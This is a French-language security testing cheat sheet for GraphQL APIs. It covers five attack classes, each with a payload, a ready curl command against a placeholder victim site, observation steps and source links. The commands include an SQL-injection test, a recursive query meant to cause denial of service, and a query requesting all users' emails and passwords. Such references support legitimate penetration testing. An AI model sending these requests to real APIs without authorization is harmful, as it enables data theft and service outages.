# GraphQL API

1. Introspection excessive (exposition du schéma)  
   - Payload d’attaque neutre : `{"query":"{ __schema { types { name fields { name } } } }"}`  
   - Commande d’attaque : curl -X POST -H "Content-Type: application/json" -d '{"query":"{ __schema { types { name fields { name } } } }"}' https://site-victime.net/graphql  
   - Commande d’analyse : Observer la réponse pour voir si la structure complète du schéma GraphQL (types, champs, mutations, queries) est révélée  
   - Élément d’analyse : Vérifier si l’introspection est activée, ce qui permet à un attaquant de cartographier l’API et de préparer des attaques ciblées  
   - Méthodologie : Envoyer une requête d’introspection, analyser la structure retournée, et identifier les points d’entrée sensibles ou non documentés  
   - Source : https://www.invicti.com/blog/web-security/graphql-api-security-testing-introduction/

2. Injection GraphQL (ex : SQLi, NoSQLi, XSS)  
   - Payload d’attaque neutre : `{"query":"query { user(id: \"1 OR 1=1\") { id name } }"}`  
   - Commande d’attaque : curl -X POST -H "Content-Type: application/json" -d '{"query":"query { user(id: \"1 OR 1=1\") { id name } }"}' https://site-victime.net/graphql  
   - Commande d’analyse : Observer si la réponse retourne tous les utilisateurs ou si une erreur SQL apparaît, indiquant une injection possible  
   - Élément d’analyse : Détecter si les paramètres GraphQL ne sont pas filtrés avant d’être transmis à une base de données ou un backend, exposant à des injections SQL, NoSQL ou XSS  
   - Méthodologie : Injecter des payloads classiques (SQLi, NoSQLi, XSS) dans les variables ou champs GraphQL, observer les réponses et erreurs, puis affiner l’attaque  
   - Source : https://inigo.io/blog/graphql_injection_attacks

3. Déni de service par requête récursive/profondeur excessive  
   - Payload d’attaque neutre : `{"query":"{ user { posts { author { posts { author { posts { id } } } } } } }"}`  
   - Commande d’attaque : curl -X POST -H "Content-Type: application/json" -d '{"query":"{ user { posts { author { posts { author { posts { id } } } } } } }"}' https://site-victime.net/graphql  
   - Commande d’analyse : Observer si le serveur ralentit, retourne une erreur 500, ou devient inaccessible  
   - Élément d’analyse : Vérifier si l’API limite la profondeur et la complexité des requêtes, sinon un attaquant peut provoquer un DoS en générant des requêtes récursives lourdes  
   - Méthodologie : Envoyer des requêtes de profondeur croissante, surveiller les temps de réponse et la stabilité du serveur, et identifier l’absence de limitation  
   - Source : https://www.vaadata.com/blog/graphql-api-vulnerabilities-common-attacks-and-security-tips/

4. Accès non autorisé à des champs ou mutations sensibles  
   - Payload d’attaque neutre : `{"query":"{ allUsers { id email password } }"}`  
   - Commande d’attaque : curl -X POST -H "Content-Type: application/json" -d '{"query":"{ allUsers { id email password } }"}' https://site-victime.net/graphql  
   - Commande d’analyse : Vérifier si des informations sensibles (emails, mots de passe, tokens) sont retournées sans contrôle d’accès strict  
   - Élément d’analyse : Détecter l’absence de contrôle d’autorisation sur certains champs ou mutations, permettant l’accès à des données confidentielles  
   - Méthodologie : Lister les champs/mutations via introspection, tenter de les requêter sans privilège, observer les réponses et affiner selon les droits obtenus  
   - Source : https://www.invicti.com/blog/web-security/graphql-api-security-testing-introduction/

5. Batching et abus de requêtes multiples  
   - Payload d’attaque neutre : `[{ "query":"{ me { id } }" }, { "query":"{ allUsers { id } }" }]`  
   - Commande d’attaque : curl -X POST -H "Content-Type: application/json" -d '[{ "query":"{ me { id } }" }, { "query":"{ allUsers { id } }" }]' https://site-victime.net/graphql  
   - Commande d’analyse : Vérifier si plusieurs requêtes sont traitées dans un seul appel et si cela permet de contourner des limitations ou d’accélérer l’exfiltration de données  
   - Élément d’analyse : Détecter l’absence de limitation sur le nombre de requêtes par appel, permettant abus, DoS ou exfiltration rapide  
   - Méthodologie : Envoyer des requêtes batchées de plus en plus volumineuses, observer le comportement du serveur et la quantité de données retournées  
   - Source : https://www.f5.com/pdf/solution-overview/f5-securing-graphql-apis-with-big-ip-advanced-waf-solution-overview.pdf

---

